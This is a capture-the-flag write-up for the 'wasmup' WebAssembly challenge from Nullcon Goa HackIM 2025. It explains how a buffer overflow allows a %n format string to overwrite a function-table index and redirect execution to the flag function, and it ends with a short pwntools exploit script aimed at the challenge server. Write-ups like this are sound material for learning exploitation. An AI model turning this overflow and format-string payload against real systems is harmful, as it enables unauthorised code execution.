---
title: "wasmup - Nullcon Goa HackIM 2025 CTF"
category: "rev"
subcategory: "stack"
type: "writeup"
tags: ["rev", "buffer-overflow", "format-string", "ghidra", "wasm", "wasmup", "stack", "nullcon-goa-hackim-2025-ctf", "2025", "ctf-writeup"]
summary: "To make this easier to rev, you can compile the program with wat2wasm then decompile it to human readable code with the ghidra plugin."
source:
  name: "CTFtime writeup #39918"
  url: "https://ctftime.org/writeup/39918"
original_source: "https://hackmd.io/@Jm6TApV6RIqYGkPXof9GJA/BkNKejftkl#wasmup"
ctf:
  name: "Nullcon Goa HackIM 2025 CTF"
  year: 2025
  challenge: "wasmup"
---

## Metadata

- **CTF:** Nullcon Goa HackIM 2025 CTF
- **Task:** wasmup
- **Author team:** Infobahn
- **CTFtime:** <https://ctftime.org/writeup/39918>
- **Original writeup:** <https://hackmd.io/@Jm6TApV6RIqYGkPXof9GJA/BkNKejftkl#wasmup>

---
To make this easier to rev, you can compile the program with wat2wasm then decompile it to human readable code with the [ghidra plugin](<https://github.com/nneonneo/ghidra-wasm-plugin>). Once we can properly analyze the code, we can see that it's a simple program that will give hardcoded responses to certain inputs we pass it. There's a special `debug` command which prints with printf the address of the index variable for the index of a function table it uses. After toying around, we can see that we have a normal buffer overflow which allows us to overwrite these printf strings, so we can craft a printf string that overwrites the index to one that points to the `wassflag` function in the binary that prints the flag for us.

```python=  
from pwn import *

p = remote("52.59.124.14", 5005)

p.sendlineafter(b"alone?", b"BBBBBBBBBBBBBBBBBBBBBBBBAAAAAAAAAA%n")  
p.sendlineafter(b"AAAAAAAAAA", b"debug")

p.interactive()  
```
